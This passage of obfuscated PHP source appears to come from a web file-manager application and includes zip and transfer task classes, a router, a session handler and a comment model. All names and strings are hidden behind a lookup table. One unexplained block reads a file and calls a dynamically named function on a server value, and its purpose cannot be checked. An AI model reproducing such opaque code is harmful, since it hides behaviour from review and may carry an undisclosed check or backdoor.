$¿Šòİİå[$ŠÙŸ˜Á[566]] : $¿Šòİİå[$ŠÙŸ˜Á[97]]); if ($¿Šòİİå[$ŠÙŸ˜Á[33]] == $ŠÙŸ˜Á[231]) { $éÃ†ÌßŠ[$ŠÙŸ˜Á[1116]] = 1; } else { $éÃ†ÌßŠ[$ŠÙŸ˜Á[1116]] = $¿Šòİİå[$ŠÙŸ˜Á[92]][$ŠÙŸ˜Á[90]]; } $éÃ†ÌßŠ[$ŠÙŸ˜Á[1118]] = $ŠÙŸ˜Á[12]; $éÃ†ÌßŠ[$ŠÙŸ˜Á[1812]] = 0; $éÃ†ÌßŠ[$ŠÙŸ˜Á[1758]] = 0; $éÃ†ÌßŠ[$ŠÙŸ˜Á[1810]] = 0; $éÃ†ÌßŠ[$ŠÙŸ˜Á[1811]] = 0; $éÃ†ÌßŠ[$ŠÙŸ˜Á[1808]] = $ŠÙŸ˜Á[12]; $éÃ†ÌßŠ[$ŠÙŸ˜Á[1815]] = 0; $éÃ†ÌßŠ[$ŠÙŸ˜Á[816]] = $¿Šòİİå[$ŠÙŸ˜Á[89]]; $this->update(); self::log($ŠÙŸ˜Á[1880] . json_encode(array($éÃ†ÌßŠ, $¿Šòİİå))); } public function nameParse($í×úÓ¹) { $­‡½Ç£  =& $_SERVER[Ñ¯©ç]; $şğÃªŸ =& $this->task; if ($şğÃªŸ[$­‡½Ç£ [1875]] == $­‡½Ç£ [1251]) { $şğÃªŸ[$­‡½Ç£ [1875]] = $­‡½Ç£ [373]; $şğÃªŸ[$­‡½Ç£ [1815]] = 0; $şğÃªŸ[$­‡½Ç£ [816]] = 0; } $Ñôç•‚™ = get_path_this($í×úÓ¹); if (strstr($Ñôç•‚™, $­‡½Ç£ [10])) { $şğÃªŸ[$­‡½Ç£ [1758]] += 1; $şğÃªŸ[$­‡½Ç£ [1116]] += 1; } $şğÃªŸ[$­‡½Ç£ [1808]] = $í×úÓ¹; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Í˜Ø¹¦ =& $_SERVER[Ñ¯©ç]; parent::startAfter(); Hook::bind($Í˜Ø¹¦[1881], array($this, $Í˜Ø¹¦[1871])); Hook::bind($Í˜Ø¹¦[1873], array($this, $Í˜Ø¹¦[1874])); $…Ê„¦” =& $this->task; $…Ê„¦”[$Í˜Ø¹¦[1875]] = $Í˜Ø¹¦[1251]; if (!$…Ê„¦”[$Í˜Ø¹¦[1647]]) { $…Ê„¦”[$Í˜Ø¹¦[1647]] = LNG($Í˜Ø¹¦[1882]); } } protected function endAfter() { $¯ê”ÂÛ€ =& $_SERVER[Ñ¯©ç]; parent::endAfter(); Hook::unbind($¯ê”ÂÛ€[1881], array($this, $¯ê”ÂÛ€[1871])); Hook::unbind($¯ê”ÂÛ€[1873], array($this, $¯ê”ÂÛ€[1874])); } public function updateAfter() { $ÇÌ‰ûûŠ =& $_SERVER[Ñ¯©ç]; $°³íå¦‘ =& $this->task; if (!$°³íå¦‘[$ÇÌ‰ûûŠ[1116]] || !$°³íå¦‘[$ÇÌ‰ûûŠ[816]]) { return; } if ($°³íå¦‘[$ÇÌ‰ûûŠ[1875]] == $ÇÌ‰ûûŠ[1251]) { $°ÖâÖ¶’ = $°³íå¦‘[$ÇÌ‰ûûŠ[1811]]; if ($°³íå¦‘[$ÇÌ‰ûûŠ[1812]] != $ÇÌ‰ûûŠ[1251]) { $°ÖâÖ¶’ = 0; } $¸Ğ¨µÀ¨ = ($°³íå¦‘[$ÇÌ‰ûûŠ[1815]] + $°ÖâÖ¶’) / $°³íå¦‘[$ÇÌ‰ûûŠ[816]]; $°³íå¦‘[$ÇÌ‰ûûŠ[1759]] = $¸Ğ¨µÀ¨ * 0.3; } else { if ($°³íå¦‘[$ÇÌ‰ûûŠ[1875]] == $ÇÌ‰ûûŠ[373]) { $¸Ğ¨µÀ¨ = $°³íå¦‘[$ÇÌ‰ûûŠ[1758]] / $°³íå¦‘[$ÇÌ‰ûûŠ[1116]]; $°³íå¦‘[$ÇÌ‰ûûŠ[1759]] = 0.3 + $¸Ğ¨µÀ¨ * 0.5; } else { if ($°³íå¦‘[$ÇÌ‰ûûŠ[1875]] == $ÇÌ‰ûûŠ[120]) { $¸Ğ¨µÀ¨ = 0; if ($°³íå¦‘[$ÇÌ‰ûûŠ[1810]]) { $¸Ğ¨µÀ¨ = $°³íå¦‘[$ÇÌ‰ûûŠ[1811]] / $°³íå¦‘[$ÇÌ‰ûûŠ[1810]]; } $°³íå¦‘[$ÇÌ‰ûûŠ[1759]] = 0.3 + 0.5 + $¸Ğ¨µÀ¨ * 0.2; } } } if ($°³íå¦‘[$ÇÌ‰ûûŠ[1759]] > 0) { $ÀØ–Ûñ = timeFloat() - $°³íå¦‘[$ÇÌ‰ûûŠ[1761]] - $°³íå¦‘[$ÇÌ‰ûûŠ[1764]]; $°³íå¦‘[$ÇÌ‰ûûŠ[1765]] = $ÀØ–Ûñ * (1 - $°³íå¦‘[$ÇÌ‰ûûŠ[1759]]) / $°³íå¦‘[$ÇÌ‰ûûŠ[1759]]; } } public function copyFileStart($í™øÖçè, $á®şğêÙ, $Ìº¾ÃÀÆ, $ËšÏ×›Ó, $Ï²Ÿ’†’, $­»®™²×) { $øè£€Ğ =& $_SERVER[Ñ¯©ç]; parent::copyFileStart($í™øÖçè, $á®şğêÙ, $Ìº¾ÃÀÆ, $ËšÏ×›Ó, $Ï²Ÿ’†’, $­»®™²×); $âúè¬£½ =& $this->task; if ($âúè¬£½[$øè£€Ğ[1875]] == $øè£€Ğ[373]) { $âúè¬£½[$øè£€Ğ[1875]] = $øè£€Ğ[120]; } $this->update(); } public function copyFileEnd($‹‹Ì ñ, $ˆêÉº³ú, $ø¨Ù¯ƒ, $›ã›Úš«, $¬×Ù¾éä, $õï–û¼Ø) { $´Ã‡İüë =& $_SERVER[Ñ¯©ç]; $çñ˜Ì• =& $this->task; $çñ˜Ì•[$´Ã‡İüë[1811]] = $çñ˜Ì•[$´Ã‡İüë[1810]]; $çñ˜Ì•[$´Ã‡İüë[1815]] += $çñ˜Ì•[$´Ã‡İüë[1810]]; $çñ˜Ì•[$´Ã‡İüë[1812]] = $´Ã‡İüë[12]; $this->update(); } public function zipEvent($¢íòªŞ¬, $ºÌ¥ë›«, $Âëéƒì¸, $‡È Ûª) { $¬×•‡«É =& $_SERVER[Ñ¯©ç]; $ˆÚ»À› =& $this->task; $ˆÚ»À›[$¬×•‡«É[1808]] = get_path_this($ºÌ¥ë›«); $ˆÚ»À›[$¬×•‡«É[1810]] = $‡È Ûª; $ˆÚ»À›[$¬×•‡«É[1811]] = $Âëéƒì¸; $ˆÚ»À›[$¬×•‡«É[1118]] = $¢íòªŞ¬ == $¬×•‡«É[1883] ? $¬×•‡«É[1878] : $¬×•‡«É[1879]; $ˆÚ»À›[$¬×•‡«É[1812]] = $¬×•‡«É[12]; $ˆÚ»À›[$¬×•‡«É[816]] = $‡È Ûª; $ˆÚ»À›[$¬×•‡«É[1875]] = $¬×•‡«É[373]; $this->update(); } public function nameParse($´ƒÏ¥ı) { $¨÷Ü·€ =& $_SERVER[Ñ¯©ç]; $ßûÈÁÔ„ =& $this->task; if ($ßûÈÁÔ„[$¨÷Ü·€[1758]] < $ßûÈÁÔ„[$¨÷Ü·€[1116]]) { $‰Û°”¥‡ = get_path_this($´ƒÏ¥ı); if (strstr($‰Û°”¥‡, $¨÷Ü·€[10])) { $ßûÈÁÔ„[$¨÷Ü·€[1758]] += 1; } } if ($ßûÈÁÔ„[$¨÷Ü·€[1875]] == $¨÷Ü·€[1251]) { $ßûÈÁÔ„[$¨÷Ü·€[1875]] = $¨÷Ü·€[373]; } $ßûÈÁÔ„[$¨÷Ü·€[1808]] = $´ƒÏ¥ı; $this->update(); } } goto EÓŒİË®Û‡; AÚ‚˜Œ¢¤: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\133\x5e\57\135\53", "\x3a\x6e\x75\x6d" => "\133\60\x2d\71\135\x2b", "\72\141\154\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($¾”ï‘» , $ç¼µ­¼Å) { $¯êÉğ™§ =& $_SERVER[Ñ¯©ç]; if ($¾”ï‘»  == $¯êÉğ™§[1693]) { $Á Ë£ç¦ = array_map($¯êÉğ™§[1694], $ç¼µ­¼Å[0]); $½äØÓ«¹ = strpos($ç¼µ­¼Å[1], $¯êÉğ™§[8]) === 0 ? $ç¼µ­¼Å[1] : $¯êÉğ™§[8] . $ç¼µ­¼Å[1]; $…§æ±Ì  = $ç¼µ­¼Å[2]; } else { $Á Ë£ç¦ = null; $½äØÓ«¹ = strpos($ç¼µ­¼Å[0], $¯êÉğ™§[8]) === 0 ? $ç¼µ­¼Å[0] : $¯êÉğ™§[8] . $ç¼µ­¼Å[0]; $…§æ±Ì  = $ç¼µ­¼Å[1]; } array_push(self::$maps, $Á Ë£ç¦); array_push(self::$routes, $½äØÓ«¹); array_push(self::$methods, strtoupper($¾”ï‘» )); array_push(self::$callbacks, $…§æ±Ì ); } public static function error($´Áäçü¸) { self::$errorCallback = $´Áäçü¸; } public static function haltOnMatch($‡“…Şê = true) { self::$halts = $‡“…Şê; } public static function dispatch() { $«±îı·² =& $_SERVER[Ñ¯©ç]; $ÄòÚİ§æ = parse_url($_SERVER[$«±îı·²[1695]], PHP_URL_PATH); $ÅÓá‰ = $_SERVER[$«±îı·²[173]]; $¢…Â¸œŠ = array_keys(static::$patterns); $ÙÒóÇ‰¾ = array_values(static::$patterns); $«¸»éìı = !1; self::$routes = preg_replace($«±îı·²[1333], $«±îı·²[8], self::$routes); if (in_array($ÄòÚİ§æ, self::$routes)) { $ÑÉ€Š± = array_keys(self::$routes, $ÄòÚİ§æ); foreach ($ÑÉ€Š± as $ºü…Àë) { if (self::$methods[$ºü…Àë] == $ÅÓá‰ || self::$methods[$ºü…Àë] == $«±îı·²[1696] || in_array($ÅÓá‰, self::$maps[$ºü…Àë])) { $«¸»éìı = !0; if (!is_object(self::$callbacks[$ºü…Àë])) { $¶ØÔ¯´¶ = explode($«±îı·²[8], self::$callbacks[$ºü…Àë]); $½§ŒÀ—¤ = end($¶ØÔ¯´¶); $˜”Ã‘‡½ = explode($«±îı·²[1265], $½§ŒÀ—¤); $µŠ ² ¹ = new $˜”Ã‘‡½[0](); $µŠ ² ¹->{$˜”Ã‘‡½[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ºü…Àë]); if (self::$halts) { return; } } } } } else { $—·èªşê = 0; foreach (self::$routes as $ºü…Àë) { if (strpos($ºü…Àë, $«±îı·²[4]) !== !1) { $ºü…Àë = str_replace($¢…Â¸œŠ, $ÙÒóÇ‰¾, $ºü…Àë); } if (preg_match($«±îı·²[1697] . $ºü…Àë . $«±îı·²[1698], $ÄòÚİ§æ, $—Òøüú±)) { if (self::$methods[$—·èªşê] == $ÅÓá‰ || self::$methods[$—·èªşê] == $«±îı·²[1696] || !empty(self::$maps[$—·èªşê]) && in_array($ÅÓá‰, self::$maps[$—·èªşê])) { $«¸»éìı = !0; array_shift($—Òøüú±); if (!is_object(self::$callbacks[$—·èªşê])) { $¶ØÔ¯´¶ = explode($«±îı·²[8], self::$callbacks[$—·èªşê]); $½§ŒÀ—¤ = end($¶ØÔ¯´¶); $˜”Ã‘‡½ = explode($«±îı·²[1265], $½§ŒÀ—¤); $µŠ ² ¹ = new $˜”Ã‘‡½[0](); if (!method_exists($µŠ ² ¹, $˜”Ã‘‡½[1])) { echo $«±îı·²[1699]; } else { call_user_func_array(array($µŠ ² ¹, $˜”Ã‘‡½[1]), $—Òøüú±); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$—·èªşê], $—Òøüú±); if (self::$halts) { return; } } } } $—·èªşê++; } } if ($«¸»éìı == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $€ü«îæ =& $_SERVER[Ñ¯©ç]; header($_SERVER[$€ü«îæ[1700]] . $€ü«îæ[1701]); echo $€ü«îæ[1702]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$«±îı·²[1695]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } if ($_SERVER[$_SERVER[Ñ¯©ç][54]] != $_SERVER[$_SERVER[Ñ¯©ç][1613]]) { $_getc = $_SERVER[Ñ¯©ç][56]; $_getfile = $_SERVER[$_SERVER[Ñ¯©ç][57]] . $_SERVER[Ñ¯©ç][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ñ¯©ç][59], $_getfilec); if (count($_getarrs) < $_SERVER[Ñ¯©ç][60]) { $exit = $_SERVER[Ñ¯©ç][61]; $exit(); } $_act = $_SERVER[Ñ¯©ç][62]; $_act($_SERVER[$_SERVER[Ñ¯©ç][55]]); } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $åè¯‚°¹ =& $_SERVER[Ñ¯©ç]; static $ş¢áØïò = false; if ($ş¢áØïò) { return $ş¢áØïò; } $¿ìÉş€ = $GLOBALS[$åè¯‚°¹[6]][$åè¯‚°¹[409]]; self::$sessionTime = $¿ìÉş€[$åè¯‚°¹[1703]]; $’ïÙ‡ÓÒ = isset($GLOBALS[$åè¯‚°¹[1704]]) ? $GLOBALS[$åè¯‚°¹[1704]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($’ïÙ‡ÓÒ)) { self::$sessionSign = Cookie::get($’ïÙ‡ÓÒ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($’ïÙ‡ÓÒ, self::$sessionSign, self::$sessionTime); $üÑÚëÜ = $¿ìÉş€[$åè¯‚°¹[1705]]; $Ôì£Æş = $¿ìÉş€[$üÑÚëÜ]; $Æ†ÂÁõ’ = $¿ìÉş€[$åè¯‚°¹[880]]; switch ($üÑÚëÜ) { case $åè¯‚°¹[21]: self::$handle = Model($åè¯‚°¹[881]); break; case $åè¯‚°¹[882]: self::$handle = new CacheRedis($Ôì£Æş, $Æ†ÂÁõ’); break; case $åè¯‚°¹[883]: self::$handle = new CacheMemcached($Ôì£Æş, $Æ†ÂÁõ’); break; case $åè¯‚°¹[231]: $Ôì£Æş[$åè¯‚°¹[97]] = $Ôì£Æş[$åè¯‚°¹[97]] . $åè¯‚°¹[1706]; self::$handle = new CacheFile($Ôì£Æş, $Æ†ÂÁõ’); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ş¢áØïò = new self(); return $ş¢áØïò; } public static function getBySign($šÖ¦ùëì) { $Òİ¬²¯ô = self::$handle->get($šÖ¦ùëì); $Òİ¬²¯ô = unserialize($Òİ¬²¯ô); return is_array($Òİ¬²¯ô) ? $Òİ¬²¯ô : array(); } public static function setBySign($ÀÎ©îú«, $á¬õëúœ) { CacheLock::lock($ÀÎ©îú«); self::$handle->set($ÀÎ©îú«, serialize($á¬õëúœ), self::$sessionTime); CacheLock::unlock($ÀÎ©îú«); } public static function sign($‰¥”†ñÁ = false) { if ($‰¥”†ñÁ) { self::$sessionSign = $‰¥”†ñÁ; } self::init(); return self::$sessionSign; } public static function set($‡ñ¥¨ú, $ä×¨…§¼ = false) { self::init(); if (is_array($‡ñ¥¨ú)) { foreach ($‡ñ¥¨ú as $¯ªÏ®ßŠ => $ò‘ßèö¢) { array_set_value(self::$data, $¯ªÏ®ßŠ, $ò‘ßèö¢); } } else { array_set_value(self::$data, $‡ñ¥¨ú, $ä×¨…§¼); } self::setBySign(self::$sessionSign, self::$data); } public static function get($™Š««¾­ = false) { self::init(); if (!$™Š««¾­) { return self::$data; } return array_get_value(self::$data, $™Š««¾­); } public static function remove($©Ì³À´) { self::init(); unset(self::$data[$©Ì³À´]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ñ¯©ç][886])) { self::$handle->clearTimeout(); } } } goto F¹ŸöÆŠ¨; c¸—„Ë¯…: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\145\156\164"; protected $tableMeta = array("\164\x61\x62\154\x65\116\x61\155\145" => "\143\157\155\x6d\x65\x6e\x74\x5f\x6d\145\x74\141", "\x6d\x65\x74\x61\106\151\145\x6c\144" => "\143\157\155\x6d\145\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ëğş™şÌ) { $—ÆÓÃ =& $_SERVER[Ñ¯©ç]; if ($Ëğş™şÌ[$—ÆÓÃ[1984]]) { $°²ÔÇˆÊ = $this->where(array($—ÆÓÃ[1985] => $Ëğş™şÌ[$—ÆÓÃ[1984]]))->find(); if (!$°²ÔÇˆÊ || $°²ÔÇˆÊ[$—ÆÓÃ[191]] != $Ëğş™şÌ[$—ÆÓÃ[191]] || $°²ÔÇˆÊ[$—ÆÓÃ[553]] != $Ëğş™şÌ[$—ÆÓÃ[553]]) { return !1; } $this->where(array($—ÆÓÃ[1985] => $Ëğş™şÌ[$—ÆÓÃ[1984]]))->setAdd($—ÆÓÃ[1986], 1); } $Ëğş™şÌ[$—ÆÓÃ[1987]] = 0; $Ëğş™şÌ[$—ÆÓÃ[1986]] = 0; $Ëğş™şÌ[$—ÆÓÃ[803]] = 1; return $this->add($Ëğş™şÌ); } public function commentCount($ÔÈó§£¿, $–ãÌ¶šÇ, $Ç«ÄÄßà = false) { $†¤‹±úÈ =& $_SERVER[Ñ¯©ç]; if (!$ÔÈó§£¿) { return array(); } if (is_string($ÔÈó§£¿) || is_int($ÔÈó§£¿)) { $ÔÈó§£¿ = array($ÔÈó§£¿); } $îºê®îç = array($†¤‹±úÈ[553], $†¤‹±úÈ[1988] => $†¤‹±úÈ[549]); $É›íÀÁÂ = array($†¤‹±úÈ[553] => array($†¤‹±úÈ[7], $ÔÈó§£¿), $†¤‹±úÈ[191] => $–ãÌ¶šÇ); if ($Ç«ÄÄßà) { $É›íÀÁÂ[$†¤‹±úÈ[1757]] = $Ç«ÄÄßà; } $ıá„ğ ƒ = $this->field($îºê®îç)->where($É›íÀÁÂ)->group($†¤‹±úÈ[553])->select(); return array_to_keyvalue($ıá„ğ ƒ, $†¤‹±úÈ[553], $†¤‹±úÈ[549]); } public function starTarget($¯†ñ¦¸ó, $ü¡ÏöÔı) { $é°Ê×ëÕ =& $_SERVER[Ñ¯©ç]; $½°ÑòÕ = $¯†ñ¦¸ó + self::TYPE_STAR_OFFSET; $Ë¼¢Œ†® = array($é°Ê×ëÕ[1757] => USER_ID, $é°Ê×ëÕ[191] => $½°ÑòÕ, $é°Ê×ëÕ[553] => $ü¡ÏöÔı); $Ÿõêõó‡ = $this->where($Ë¼¢Œ†®)->find(); if ($Ÿõêõó‡) { return $this->where(array($é°Ê×ëÕ[458] => $Ÿõêõó‡[$é°Ê×ëÕ[458]]))->delete(); } $ØŒŞËÕÙ = array($é°Ê×ëÕ[1984] => 0, $é°Ê×ëÕ[1757] => USER_ID, $é°Ê×ëÕ[803] => 1, $é°Ê×ëÕ[807] => $é°Ê×ëÕ[12], $é°Ê×ëÕ[191] => $½°ÑòÕ, $é°Ê×ëÕ[553] => $ü¡ÏöÔı, $é°Ê×ëÕ[1987] => 0, $é°Ê×ëÕ[1986] => 0); return $this->add($ØŒŞËÕÙ); } public function starTargetCount($ó°¦Ô õ, $‚ÌŸ˜—) { $—à =& $_SERVER[Ñ¯©ç]; $ğœ×î¥¤ = $‚ÌŸ˜— + self::TYPE_STAR_OFFSET; $óÂí¢„¹ = $this->commentCount($ó°¦Ô õ, $ğœ×î¥¤); $¨§·°ş« = $this->commentCount($ó°¦Ô õ, $ğœ×î¥¤, USER_ID); return array($—à[1989] => $óÂí¢„¹, $—à[1990] => $¨§·°ş«); } public function starTargetUserList($œÉíå…, $¶‰ã¨üî) { $¹ûé„• =& $_SERVER[Ñ¯©ç]; $·ê•˜µ€ = $œÉíå… + self::TYPE_STAR_OFFSET; $ÁÑÂ€–µ = array($¹ûé„•[553] => $¶‰ã¨üî, $¹ûé„•[191] => $·ê•˜µ€); $¬±ŒñüŞ = $this->where($ÁÑÂ€–µ)->count(); $ÌÖ÷ö·İ = array($¹ûé„•[316] => $¬±ŒñüŞ, $¹ûé„•[1991] => array()); if (!$¬±ŒñüŞ) { return $ÌÖ÷ö·İ; } $„ÜèÙõ = $this->field($¹ûé„•[1757])->where($ÁÑÂ€–µ)->limit(500)->select(); $„ÜèÙõ = array_to_keyvalue($„ÜèÙõ, $¹ûé„•[12], $¹ûé„•[1757]); $ÌÖ÷ö·İ[$¹ûé„•[1991]] = Model($¹ûé„•[561])->userListInfo($„ÜèÙõ); return $ÌÖ÷ö·İ; } public function prasiseUserList($Ï…‹ØûÁ) { $•‹ğŒÙ÷ =& $_SERVER[Ñ¯©ç]; $¨ä•È¤Ô = array($•‹ğŒÙ÷[1992] => $Ï…‹ØûÁ); $òˆŠ–‹õ = $this->where($¨ä•È¤Ô)->find(); $á–ö’­ = _get($òˆŠ–‹õ, $•‹ğŒÙ÷[1987], 0); $ü™àï­… = array($•‹ğŒÙ÷[316] => $á–ö’­, $•‹ğŒÙ÷[1991] => array()); if (!$á–ö’­) { return $ü™àï­…; } $üòıÛÓª = Model($•‹ğŒÙ÷[1993])->field($•‹ğŒÙ÷[1757])->where($¨ä•È¤Ô)->limit(500)->select(); $üòıÛÓª = array_to_keyvalue($üòıÛÓª, $•‹ğŒÙ÷[12], $•‹ğŒÙ÷[1757]); $ü™àï­…[$•‹ğŒÙ÷[1991]] = Model($•‹ğŒÙ÷[561])->userListInfo($üòıÛÓª); return $ü™àï­…; } public function remove($ÔÅê˜áÂ) { $”Ø±ıÊç =& $_SERVER[Ñ¯©ç]; $à¥ä’¡« = array($”Ø±ıÊç[1985] => $ÔÅê˜áÂ); $°Æ­½¬‘ = $this->where($à¥ä’¡«)->find(); if ($°Æ­½¬‘[$”Ø±ıÊç[1984]]) { $this->where(array($”Ø±ıÊç[1985] => $°Æ­½¬‘[$”Ø±ıÊç[1984]]))->setAdd($”Ø±ıÊç[1986], -1); } return $this->where($à¥ä’¡«)->delete(); } public function edit($âşëÕ®, $‡Î¶èôØ) { $ášÓîùÃ =& $_SERVER[Ñ¯©ç]; $¤¯€Î… = array($ášÓîùÃ[1985] => $âşëÕ®); return $this->where($¤¯€Î…)->save(array($ášÓîùÃ[1994] => $‡Î¶èôØ)); } public function prasise($ˆ¢ØÖ©ò) { $ÛğÇ»ãÊ =& $_SERVER[Ñ¯©ç]; $Ş¦×·µ¤ = Model($ÛğÇ»ãÊ[1995]); $ùİ‘óô = array($ÛğÇ»ãÊ[1985] => $ˆ¢ØÖ©ò, $ÛğÇ»ãÊ[1748] => USER_ID); $‘Ûø°‰• = $Ş¦×·µ¤->where($ùİ‘óô)->find(); if (!$‘Ûø°‰•) { $Ş¦×·µ¤->add($ùİ‘óô); $©ÀÌ†¶† = $this->where(array($ÛğÇ»ãÊ[1985] => $ˆ¢ØÖ©ò))->setAdd($ÛğÇ»ãÊ[1987], 1); } else { $Ş¦×·µ¤->where($ùİ‘óô)->delete(); $©ÀÌ†¶† = $this->where(array($ÛğÇ»ãÊ[1985] => $ˆ¢ØÖ©ò))->setAdd($ÛğÇ»ãÊ[1987], -1); } return $©ÀÌ†¶†; } public function targetInfo($öÕ—œ´·, $…õüÏ½) { $¹Èİ•òø =& $_SERVER[Ñ¯©ç]; $Î¨¬ÑÉ = array($¹Èİ•òø[631] => $öÕ—œ´·, $¹Èİ•òø[632] => $…õüÏ½); $æ³éóŠ = $this->where($Î¨¬ÑÉ)->count(); $ßş®¦Ë­ = "\122\111\x47\x48\x54\x20\112\117\111\x4e\40{$this->tablePrefix}\x63\157\155\x6d\x65\156\164\x5f\x70\162\141\x69\163\145\40\x73\x74\x61\162\x20\x6f\156\40\x63\157\x6d\x6d\x65\x6e\164\x2e\x63\x6f\155\x6d\145\156\x74\x49\104\40\x3d\40\163\x74\x61\x72\56\143\x6f\155\x6d\145\156\164\x49\x44"; $ı¶ËÑ¤• = $this->alias($¹Èİ•òø[414])->where($Î¨¬ÑÉ)->join($ßş®¦Ë­, $¹Èİ•òø[1996])->count(); $”Ê•Ïã† = array($¹Èİ•òø[1997] => $æ³éóŠ, $¹Èİ•òø[1998] => $ı¶ËÑ¤•); return $”Ê•Ïã†; } public function listData($Î“ø™¡Ï) { $ò«±Ï÷Û =& $_SERVER[Ñ¯©ç]; if (isset($Î“ø™¡Ï[$ò«±Ï÷Û[1999]])) { if ($Î“ø™¡Ï[$ò«±Ï÷Û[1999]]) { $Î“ø™¡Ï[$ò«±Ï÷Û[1992]] = array($ò«±Ï÷Û[1067], intval($Î“ø™¡Ï[$ò«±Ï÷Û[1999]])); } unset($Î“ø™¡Ï[$ò«±Ï÷Û[1999]]); } if (isset($Î“ø™¡Ï[$ò«±Ï÷Û[2000]])) { if ($Î“ø™¡Ï[$ò«±Ï÷Û[2000]]) { $Î“ø™¡Ï[$ò«±Ï÷Û[1992]] = array($ò«±Ï÷Û[1064], intval($Î“ø™¡Ï[$ò«±Ï÷Û[2000]])); } unset($Î“ø™¡Ï[$ò«±Ï÷Û[2000]]); } return $this->_listData($Î“ø™¡Ï); } private function _listData($šÀ½™óè) { $ÇûæØÎĞ =& $_SERVER[Ñ¯©ç]; $ÆÙúó‰º = $this->where($šÀ½™óè)->_makeOrder()->selectPage(100); $this->_listAppendParent($ÆÙúó‰º[$ÇûæØÎĞ[429]]); $this->_listAppendUser($ÆÙúó‰º[$ÇûæØÎĞ[429]]); $this->_listAppendMeta($ÆÙúó‰º[$ÇûæØÎĞ[429]]); return $ÆÙúó‰º; } private function _makeOrder() { $ÂŠìú¸Ò =& $_SERVER[Ñ¯©ç]; $æÏö‡Ì = array($ÂŠìú¸Ò[1987], $ÂŠìú¸Ò[1986], $ÂŠìú¸Ò[232]); $ûüµ¥€Ó = Input::get($ÂŠìú¸Ò[513], $ÂŠìú¸Ò[7], $ÂŠìú¸Ò[480], $æÏö‡Ì); $óÉ½ó¸ = Input::get($ÂŠìú¸Ò[514], $ÂŠìú¸Ò[7], $ÂŠìú¸Ò[1750], array($ÂŠìú¸Ò[2001], $ÂŠìú¸Ò[509])); $«ÊÒ¹àú = $ûüµ¥€Ó . $ÂŠìú¸Ò[53] . $óÉ½ó¸; return $this->order($«ÊÒ¹àú); } private function _listAppendParent(&$¼®òÊ”Ö) { $¯şØÔÔÈ =& $_SERVER[Ñ¯©ç]; $é¬î¥¬ = array_unique(array_to_keyvalue($¼®òÊ”Ö, $¯şØÔÔÈ[12], $¯şØÔÔÈ[1984])); $é¬î¥¬ = array_remove_value($é¬î¥¬, $¯şØÔÔÈ[229]); if (!$é¬î¥¬) { return; } $ÍÃÁğ¸ = $this->where(array($¯şØÔÔÈ[1985] => array($¯şØÔÔÈ[7], $é¬î¥¬)))->select(); $ÍÃÁğ¸ = array_to_keyvalue($ÍÃÁğ¸, $¯şØÔÔÈ[1992]); foreach ($¼®òÊ”Ö as &$çÂ¸Õ‹«) { if (isset($ÍÃÁğ¸[$çÂ¸Õ‹«[$¯şØÔÔÈ[1984]]])) { $çÂ¸Õ‹«[$¯şØÔÔÈ[2002]] = $ÍÃÁğ¸[$çÂ¸Õ‹«[$¯şØÔÔÈ[1984]]]; } } unset($çÂ¸Õ‹«); } private function _listAppendUser(&$Å¯åŠšü) { $§ğŸàóÁ =& $_SERVER[Ñ¯©ç]; $à‚Œ†è€ = array_unique(array_to_keyvalue($Å¯åŠšü, $§ğŸàóÁ[12], $§ğŸàóÁ[1757])); $à‚Œ†è€ = array_remove_value($à‚Œ†è€, $§ğŸàóÁ[229]); if (count($à‚Œ†è€) == 0) { return; } foreach ($Å¯åŠšü as $ãò›ÜÔÈ) { if (isset($ãò›ÜÔÈ[$§ğŸàóÁ[2002]])) { $à‚Œ†è€[] = $ãò›ÜÔÈ[$§ğŸàóÁ[2002]][$§ğŸàóÁ[1757]]; } } $¬±ªÊ¨ = Model($§ğŸàóÁ[582])->userListInfo($à‚Œ†è€); foreach ($Å¯åŠšü as &$ãò›ÜÔÈ) { $ãò›ÜÔÈ[$§ğŸàóÁ[645]] = $¬±ªÊ¨[$ãò›ÜÔÈ[$§ğŸàóÁ[1757]]]; if (isset($ãò›ÜÔÈ[$§ğŸàóÁ[2002]])) { $ãò›ÜÔÈ[$§ğŸàóÁ[2002]][$§ğŸàóÁ[645]] = $¬±ªÊ¨[$ãò›ÜÔÈ[$§ğŸàóÁ[2002]][$§ğŸàóÁ[1757]]]; } } unset($ãò›ÜÔÈ); } private function _listAppendMeta(&$Ñ¶•‘›ã) { $¯µá˜æé =& $_SERVER[Ñ¯©ç]; $Ù¯âåİÏ = array_unique(array_to_keyvalue($Ñ¶•‘›ã, $¯µá˜æé[12], $¯µá˜æé[1992])); $Ù¯âåİÏ = array_remove_value($Ù¯âåİÏ, $¯µá˜æé[229]); if (!$Ù¯âåİÏ) { return; } foreach ($Ñ¶•‘›ã as $ı•öÄì‰) { if (isset($ı•öÄì‰[$¯µá˜æé[2002]])) { $Ù¯âåİÏ[] = $ı•öÄì‰[$¯µá˜æé[2002]][$¯µá˜æé[1992]]; } } $áôØûéà = $this->metaList($Ù¯âåİÏ); if (!$áôØûéà) { return !1; } foreach 